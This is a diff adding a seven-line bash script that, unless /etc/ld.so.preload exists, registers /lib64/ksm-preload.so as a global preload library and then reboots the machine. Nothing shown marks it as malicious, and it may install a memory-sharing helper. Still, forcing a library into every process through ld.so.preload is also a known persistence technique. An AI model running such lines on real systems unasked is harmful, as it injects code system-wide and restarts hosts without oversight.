@@ -1,0 +1,7 @@
+#!/bin/bash
+
+[ -e "/etc/ld.so.preload" ] && exit
+
+echo "/lib64/ksm-preload.so" > /etc/ld.so.preload
+
+reboot
